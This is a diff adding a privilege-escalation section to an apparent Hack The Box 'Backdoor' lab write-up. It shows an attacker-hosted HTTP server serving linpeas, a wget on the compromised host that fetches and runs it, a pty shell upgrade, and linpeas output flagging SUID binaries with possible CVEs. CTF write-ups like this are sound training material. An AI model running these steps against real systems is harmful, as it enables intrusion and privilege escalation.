@@ -500,5 +500,78 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 /bin/sh: 2: python: not found
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 user@Backdoor:/home/user$ 
+
 ```
+# Privledge Escalation 
+
+### Linpeas
+
+Now lets work on getting linpeas over to out victim system by creating a webserver and running wget on the victim systems.
+
+``` console
+noob2uub@kali:~/Documents/HTB/backdoor$ python3 -m http.server --bind 10.10.14.156 8080
+Serving HTTP on 10.10.14.156 port 8080 (http://10.10.14.156:8080/) ...
+10.10.11.125 - - [07/Apr/2022 18:34:05] "GET /linpeas.sh HTTP/1.1" 200 -
+10.10.11.125 - - [07/Apr/2022 18:35:51] "GET /linpeas.sh HTTP/1.1" 200 -
+```
+
+```console
+user@Backdoor:/home/user$ wget 10.10.14.156:8080/linpeas.sh -P /home/user            
+wget 10.10.14.156:8080/linpeas.sh -P /home/user
+--2022-04-08 01:35:51--  http://10.10.14.156:8080/linpeas.sh
+Connecting to 10.10.14.156:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 765823 (748K) [text/x-sh]
+Saving to: ‘/home/user/linpeas.sh’
+
+linpeas.sh          100%[===================>] 747.87K  1017KB/s    in 0.7s    
+
+2022-04-08 01:35:51 (1017 KB/s) - ‘/home/user/linpeas.sh’ saved [765823/765823]
+
+user@Backdoor:/home/user$ ls
+ls
+linpeas.sh  user.txt
+user@Backdoor:/home/user$ 
+```
+### Linpeas
+
+```console
+user@Backdoor:/home/user$ ./linpeas.sh -a > /dev/shm/linpeas.txt 
+./linpeas.sh -a > /dev/shm/linpeas.txt 
+bash: ./linpeas.sh: Permission denied
+user@Backdoor:/home/user$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+user@Backdoor:/home/user$ ./linpeas.sh 
+./linpeas.sh
+```
+
+You can see that i was getting permission denied. Some times you just had to much to drink and cant think of what to do, but its a good think I was not at that tipping point just yet. Of course chmod to make the file executable. 
+
+```console
+═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                                                                                                    
+                                         ╚═══════════════════╝                                                                                                                                                                             
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                
+strings Not Found                                                                                                                                                                                                                          
+-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                  
+-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 23K May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 463K Jul 23  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 67K Jul 14  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 84K Jul 14  2021 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd
+-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 67K Jul 21  2020 /usr/bin/su
+-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
+-rwsr-xr-x 1 root root 464K Feb 23  2021 /usr/bin/screen  --->  GNU_Screen_4.5.0
+-rwsr-xr-x 1 root root 39K Jul 21  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 55K Jul 21  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 52K Jul 14  2021 /usr/bin/chsh
+-rwsr-xr-x 1 root root 31K May 26  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+```
+
+
+
 
